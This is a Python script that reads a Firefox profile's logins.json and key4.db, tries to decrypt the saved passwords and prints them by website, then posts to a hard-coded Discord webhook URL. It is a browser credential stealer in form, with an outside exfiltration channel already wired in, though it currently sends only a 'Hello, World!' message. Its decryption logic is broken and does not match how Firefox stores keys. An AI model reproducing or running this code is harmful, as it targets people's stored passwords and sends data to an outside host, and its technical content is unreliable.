import os
import json
import sqlite3
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.exceptions import InvalidKey
import requests

def get_firefox_passwords(profile_path):
    # Path to the logins.json file and key4.db
    logins_file = os.path.join(profile_path, "logins.json")
    key_file = os.path.join(profile_path, "key4.db")

    if not os.path.exists(logins_file) or not os.path.exists(key_file):
        print("Logins or Key file does not exist.")
        return {}

    # Extract encryption key
    conn = sqlite3.connect(key_file)
    cursor = conn.cursor()
    
    # Fetch the Firefox key
    cursor.execute("SELECT item1, item2 FROM metadata WHERE id='password'")
    key_data = cursor.fetchone()
    conn.close()

    if not key_data or len(key_data) < 1:
        print("No encryption key found.")
        return {}

    salt = key_data[0]
    iterations = 100000
    length = 32

    # Use the salt and derive the key using Scrypt
    scrypt = Scrypt(salt=salt, length=length, n=16384, r=8, p=1, maxmem=0, backend=default_backend())
    password_key = scrypt.derive(key_data[1])

    # Now decrypt the passwords
    with open(logins_file, "r", encoding="utf-8") as f:
        logins_data = json.load(f)

    passwords = {}
    
    for login in logins_data.get("logins", []):
        encrypted_password = login["password"]
        # Decrypt the password (assuming it is Base64 encoded)
        try:
            decrypted_password = password_key.decrypt(encrypted_password)
            passwords[login["hostname"]] = decrypted_password.decode("utf-8")
        except InvalidKey:
            print(f"Failed to decrypt password for {login['hostname']}.")

    return passwords


# Example usage
if __name__ == "__main__":
    # Replace with your actual Firefox profile path
    firefox_profile_path = r"C:\Users\<YourUsername>\AppData\Roaming\Mozilla\Firefox\Profiles\<YourProfile>"

    passwords = get_firefox_passwords(firefox_profile_path)
    for website, password in passwords.items():
        print(f"Website: {website}, Password: {password}")

    # Send a message to the Discord webhook
    try:
        discord_webhook_url = "https://discord.com/api/webhooks/1328642106830356481/zyoly0RgW28B7S6iUKG3wubJrPIT8SlhAt6Iw73pkeD3hUsKQXQvvqRPmZY5q2UdO5n_"
        message = {
            "content": "Hello, World!"
        }
        response = requests.post(discord_webhook_url, data=json.dumps(message), headers={"Content-Type": "application/json"})
        print(f"Webhook sent. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending webhook: {str(e)}")

    print("Finished retrieving passwords.")
